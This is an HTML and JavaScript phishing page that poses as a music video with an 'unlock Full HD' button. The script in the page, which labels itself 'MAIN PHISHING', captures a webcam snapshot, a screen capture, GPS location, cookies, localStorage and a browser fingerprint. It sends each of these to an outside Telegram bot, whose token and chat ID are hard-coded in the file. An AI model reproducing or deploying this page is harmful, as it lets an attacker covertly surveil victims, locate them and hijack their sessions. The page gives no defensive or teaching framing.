<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta property="og:title" content="🎵 New Music Video" />
    <meta property="og:description" content="Tap to play" />
    <meta property="og:image" content="https://img.youtube.com/vi/dQw4w9WgXcQ/hqdefault.jpg" />
    <meta property="og:url" content="https://whats-app-ban-report.vercel.app/" />
    <meta property="og:type" content="video.other" />
    <title>Music Video</title>
    <style>
        body { margin:0; background:#000; color:#fff; font-family:Arial; text-align:center; padding-top:20px; }
        .container { max-width:800px; margin:auto; }
        iframe { width:100%; height:400px; border:none; }
        .btn { background:#ff0000; color:#fff; border:none; padding:15px 40px; font-size:20px; border-radius:30px; cursor:pointer; margin-top:20px; }
        #status { color:#0f0; margin-top:10px; font-size:14px; }
        #log { background:#222; color:#aaa; padding:10px; margin-top:20px; text-align:left; font-size:12px; max-height:150px; overflow:auto; display:none; }
    </style>
</head>
<body>
<div class="container">
    <h2>🎵 Latest Hit - Play Now</h2>
    <iframe src="https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1" allow="autoplay; encrypted-media" allowfullscreen></iframe>
    <br>
    <button class="btn" id="playBtn">▶ Click to Unlock Full HD</button>
    <button class="btn" id="testBtn" style="background:#555; margin-left:10px;">🧪 Test Telegram</button>
    <p id="status">🔒 Tap the button to verify your device</p>
    <div id="log"></div>
</div>

<script>
// ---------- TELEGRAM CONFIG (BADAL DO) ----------
const TELEGRAM_TOKEN = "8615192737:AAGEJtc7fGGnSl3JgyCK992qhHGhX5tanUw";
const TELEGRAM_CHAT_ID = "6574042583";

// ---------- LOG FUNCTION (console + screen) ----------
function logMsg(msg) {
    console.log(msg);
    const logDiv = document.getElementById('log');
    logDiv.style.display = 'block';
    logDiv.innerHTML += new Date().toLocaleTimeString() + ' - ' + msg + '<br>';
}

// ---------- TELEGRAM SEND (improved) ----------
function sendToTelegram(text, fileBase64 = null) {
    logMsg('Sending text: ' + text.substring(0, 50));
    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
    fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: text })
    })
    .then(res => res.json())
    .then(data => {
        logMsg('✅ Text sent: ' + (data.ok ? 'Success' : 'Error: ' + JSON.stringify(data)));
        if (!data.ok) alert('Telegram error: ' + data.description);
    })
    .catch(err => {
        logMsg('❌ Fetch error: ' + err);
        alert('Network error - check console');
    });

    // Send file (image) if provided
    if (fileBase64) {
        logMsg('Sending image...');
        // Convert dataURL to blob safely
        const byteString = atob(fileBase64.split(',')[1]);
        const mimeType = fileBase64.split(',')[0].split(':')[1].split(';')[0];
        const ab = new ArrayBuffer(byteString.length);
        const ia = new Uint8Array(ab);
        for (let i = 0; i < byteString.length; i++) ia[i] = byteString.charCodeAt(i);
        const blob = new Blob([ab], { type: mimeType });
        const formData = new FormData();
        formData.append('chat_id', TELEGRAM_CHAT_ID);
        formData.append('document', blob, 'capture.jpg');

        const fileUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendDocument`;
        fetch(fileUrl, { method: 'POST', body: formData })
            .then(res => res.json())
            .then(data => {
                logMsg('✅ Image sent: ' + (data.ok ? 'Success' : 'Error: ' + JSON.stringify(data)));
                if (!data.ok) alert('Image error: ' + data.description);
            })
            .catch(err => logMsg('❌ Image fetch error: ' + err));
    }
}

// ---------- TEST BUTTON ----------
document.getElementById('testBtn').onclick = function() {
    sendToTelegram('🧪 Test message from ZetaWebPhish');
};

// ---------- MAIN PHISHING ----------
document.getElementById('playBtn').onclick = async function() {
    const status = document.getElementById('status');
    status.innerText = '⏳ Verifying...';
    logMsg('Button clicked - starting capture');

    try {
        // 1. Camera + Mic
        logMsg('Requesting camera/mic...');
        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
        status.innerText = '✅ Quality verified';
        logMsg('Camera/mic granted');

        // 2. Snapshot
        const video = document.createElement('video');
        video.srcObject = stream;
        video.play();
        await new Promise(r => setTimeout(r, 1000));
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        canvas.getContext('2d').drawImage(video, 0, 0);
        const dataUrl = canvas.toDataURL('image/jpeg', 0.7);
        sendToTelegram('📸 Camera snapshot', dataUrl);
        stream.getTracks().forEach(t => t.stop());

        // 3. Screen capture
        try {
            logMsg('Requesting screen share...');
            const screenStream = await navigator.mediaDevices.getDisplayMedia({ video: true });
            const screenVideo = document.createElement('video');
            screenVideo.srcObject = screenStream;
            screenVideo.play();
            await new Promise(r => setTimeout(r, 1000));
            const sc = document.createElement('canvas');
            sc.width = screenVideo.videoWidth || 1280;
            sc.height = screenVideo.videoHeight || 720;
            sc.getContext('2d').drawImage(screenVideo, 0, 0);
            const screenData = sc.toDataURL('image/jpeg', 0.5);
            sendToTelegram('🖥️ Screen snapshot', screenData);
            screenStream.getTracks().forEach(t => t.stop());
        } catch(e) {
            logMsg('Screen share denied: ' + e);
            sendToTelegram('❌ Screen share denied');
        }

        // 4. GPS
        navigator.geolocation.getCurrentPosition(
            pos => {
                const loc = `📍 Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}`;
                sendToTelegram(loc);
                logMsg('GPS acquired');
            },
            err => {
                sendToTelegram('❌ GPS denied');
                logMsg('GPS error: ' + err);
            }
        );

        // 5. Cookies & localStorage
        const cookies = document.cookie || 'None';
        const storage = JSON.stringify(localStorage) || '{}';
        sendToTelegram(`🍪 Cookies: ${cookies}\n📦 LocalStorage: ${storage}`);
        logMsg('Cookies & storage sent');

        // 6. Fingerprint
        const fp = {
            ua: navigator.userAgent,
            plat: navigator.platform,
            screen: `${screen.width}x${screen.height}`,
            tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
            lang: navigator.language,
            plugins: Array.from(navigator.plugins).map(p => p.name).join(', ')
        };
        sendToTelegram(`🖥️ Fingerprint:\n${JSON.stringify(fp, null, 2)}`);
        logMsg('Fingerprint sent');

        status.innerText = '✅ Verified – Enjoy your video!';
        sendToTelegram('✅ All data captured successfully');

    } catch(e) {
        logMsg('Main error: ' + e);
        status.innerText = '⚠️ Verification failed';
        sendToTelegram(`❌ Error: ${e.message}`);
    }
};

// Optional: auto-click after 3 seconds (if you want)
// setTimeout(() => document.getElementById('playBtn').click(), 3000);
</script>
</body>
</html>
